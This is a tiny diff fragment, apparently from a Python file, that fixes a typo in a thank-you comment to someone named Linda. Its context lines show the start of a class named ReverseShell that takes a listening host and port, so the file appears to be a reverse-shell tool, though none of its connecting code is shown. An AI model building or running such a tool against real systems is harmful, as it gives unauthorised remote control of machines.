@@ -19,7 +19,7 @@ import os
      
 '''
 '''
-Thanks Linda, you sre the best.
+Thanks Linda, you are the best.
 '''
 class ReverseShell:
     def __init__(self, lhost, lport):
